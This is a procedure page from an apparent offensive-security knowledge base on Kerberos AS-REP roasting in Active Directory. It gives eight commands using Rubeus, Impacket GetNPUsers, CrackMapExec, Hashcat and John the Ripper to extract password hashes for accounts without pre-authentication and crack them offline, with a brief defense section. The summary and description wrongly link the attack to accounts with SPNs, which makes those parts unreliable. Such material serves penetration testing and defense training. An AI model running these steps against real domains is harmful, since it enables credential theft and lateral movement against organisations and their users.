---
id: 0fa459bd-6a52-42d1-b572-c4ca195c40dc
name: Kerberos-AS-REP-Roasting-Attack
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:04.999458+00:00'
updated_at: '2023-04-10T20:26:39.194075+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - >-
    [[techniques/Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos
    Tickets]]
sub_techniques:
  - '[[sub-techniques/AS-REP Roasting|T1558.004 - AS-REP Roasting]]'
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/KRB-AS-REP-Roasting]]'
commands:
  - '[[commands/rubeus-asrep-roast-user]]'
  - '[[commands/getnpusers-no-pass-single-user]]'
  - '[[commands/getnpusers-usersfile-hashcat]]'
  - '[[commands/getnpusers-request-format-hashcat]]'
  - '[[commands/crackmapexec-ldap-asreproast]]'
  - '[[commands/hashcat-crack-asrep-linux]]'
  - '[[commands/hashcat-crack-asrep-windows]]'
  - '[[commands/john-crack-asrep]]'
platforms:
  - Windows
  - Linux
tools:
  - '[[tools/Rubeus]]'
  - '[[tools/Impacket]]'
  - '[[tools/CrackMapExec]]'
  - '[[tools/Hashcat]]'
  - '[[tools/John-the-Ripper]]'
validated: true
---

# Kerberos-AS-REP-Roasting-Attack

## Summary

The Kerberos AS-REP Roasting Attack extracts Kerberos AS-REP messages for user accounts that do not require pre-authentication, allowing offline cracking of password hashes. This procedure targets Active Directory environments to obtain credentials from users with service principal names (SPNs) set, enabling further lateral movement or privilege escalation.

## Description

In Kerberos authentication, AS-REP Roasting exploits accounts configured without pre-authentication (via the 'Do not require Kerberos preauthentication' flag), typically those with SPNs. An attacker requests an AS-REP from the domain controller without providing a password, receiving an encrypted ticket containing a hash of the user's password. This hash (in krb5asrep format) can then be cracked offline using tools like Hashcat or John the Ripper. The attack requires domain knowledge but no initial credentials, making it useful in reconnaissance or initial access phases against Windows Active Directory domains.

## Requirements

1. Network access to the domain controller (port 88 UDP/TCP for Kerberos).
2. Knowledge of target usernames or a list of users with SPNs (e.g., from enumeration via LDAP queries).
3. Installed tools: Rubeus (Windows), Impacket (Linux/Windows), CrackMapExec, Hashcat, or John the Ripper.
4. A wordlist for cracking (e.g., rockyou.txt).
5. Domain-joined or external position with resolvability of the domain.

## Defense

- Enforce Kerberos pre-authentication on all user accounts and disable it only when necessary.
- Monitor for anomalous AS-REQ requests without pre-auth (Event ID 4768/4771 in Windows logs).
- Implement strong password policies, especially for service accounts, and rotate passwords regularly.
- Use tools like Microsoft ATA or SIEM to detect unusual Kerberos traffic patterns.

## Objectives

1. Identify and request AS-REP messages for vulnerable user accounts.
2. Extract and save hashes in crackable formats (e.g., hashcat, John).
3. Crack the hashes offline to recover plaintext passwords.
4. Use recovered credentials for further domain compromise.

## Instructions

### Step 1: Perform AS-REP Roasting with Rubeus

**Context**: Use Rubeus on a Windows machine to request AS-REP for a specific user without pre-authentication. This step targets users with SPNs and outputs the hash in hashcat format for cracking.

**Command** ([[commands/rubeus-asrep-roast-user]]):
```powershell
Rubeus.exe asreproast /user:$_TARGET_USER /format:hashcat /outfile:$_OUTPUT_FILE
```

> This command builds and sends an AS-REQ without pre-auth to the domain controller, receiving the AS-REP with the encrypted hash. Replace $_TARGET_USER with the username (e.g., TestOU3user) and $_OUTPUT_FILE with the desired output file (e.g., hashes.asreproast). Expected output includes the target details, connection info, and the extracted hash in the format $krb5asrep$username@domain:hash_value.

### Step 2: Extract AS-REP Hash for Single User with Impacket

**Context**: On Linux, use Impacket's GetNPUsers.py to request a TGT (which includes the AS-REP hash) for a single user without a password. This is ideal for testing specific service accounts.

**Command** ([[commands/getnpusers-no-pass-single-user]]):
```bash
python GetNPUsers.py $_DOMAIN/$_TARGET_USER -no-pass -format hashcat -outputfile $_OUTPUT_FILE
```

> Specify the domain (e.g., htb.local) and target user (e.g., svc-alfresco). The -no-pass flag skips authentication. Expected output is the krb5asrep hash directly in the terminal or file, e.g., $krb5asrep$23$svc-alfresco@HTB.LOCAL:hash_value.

### Step 3: Extract Hashes from User List with Impacket

**Context**: For bulk extraction, provide a file of usernames to GetNPUsers.py. This step roasts multiple users efficiently, saving hashes to a file for batch cracking.

**Command** ([[commands/getnpusers-usersfile-hashcat]]):
```bash
python GetNPUsers.py $_DOMAIN/ -usersfile $_USERS_FILE -format hashcat -outputfile $_OUTPUT_FILE
```

> Use a usersfile (e.g., usernames.txt) listing target users. Expected output: Multiple krb5asrep hashes appended to the output file, one per vulnerable user.

### Step 4: Request AS-REP with Credentials Using Impacket

**Context**: If partial credentials are available, use the -request flag to obtain AS-REP for a user. This variant authenticates first but still extracts the hash.

**Command** ([[commands/getnpusers-request-format-hashcat]]):
```bash
python GetNPUsers.py $_DOMAIN/$_TARGET_USER:$_PASSWORD -request -format hashcat -outputfile $_OUTPUT_FILE
```

> Provide domain, user, and password. Expected output: The requested TGT hash in the specified format, saved to file.

### Step 5: Perform AS-REP Roasting with CrackMapExec

**Context**: Use CrackMapExec over LDAP to roast AS-REP for users, leveraging existing credentials if needed. This integrates with other CME modules for domain enumeration.

**Command** ([[commands/crackmapexec-ldap-asreproast]]):
```bash
crackmapexec ldap $_TARGET_IP -u $_USERNAME -p $_PASSWORD --kdcHost $_KDC_IP --asreproast $_OUTPUT_FILE
```

> Target the DC IP, provide creds, and specify KDC. Expected output: LDAP response with extracted krb5asrep hashes for roastable users, saved to file.

### Step 6: Crack Hashes with Hashcat on Linux

**Context**: Once hashes are extracted, use Hashcat in dictionary mode to crack them. Mode 18200 is specific to Kerberos AS-REP.

**Command** ([[commands/hashcat-crack-asrep-linux]]):
```bash
hashcat -m 18200 --force -a 0 $_HASH_FILE $_WORDLIST
```

> Load the hash file (e.g., hashes.asreproast) and wordlist (e.g., passwords_kerb.txt). Expected output: Cracked passwords displayed if matches found, e.g., username:plaintext_password.

### Step 7: Crack Hashes with Hashcat on Windows

**Context**: For Windows environments, use the 64-bit executable with similar parameters.

**Command** ([[commands/hashcat-crack-asrep-windows]]):
```bash
hashcat64.exe -m 18200 '$_HASH_STRING' -a 0 $_WORDLIST_PATH
```

> Use inline hash or file; wordlist path like c:\wordlists\rockyou.txt. Expected output: Same as Linux variant, with progress and cracked results.

### Step 8: Crack Hashes with John the Ripper

**Context**: Alternative cracker using John, specifying the krb5asrep format for AS-REP hashes.

**Command** ([[commands/john-crack-asrep]]):
```bash
john --format=krb5asrep --wordlist=$_WORDLIST $_HASH_FILE
```

> Specify wordlist and hash file. Expected output: Cracked passwords in John's output format, viewable with 'john --show'.
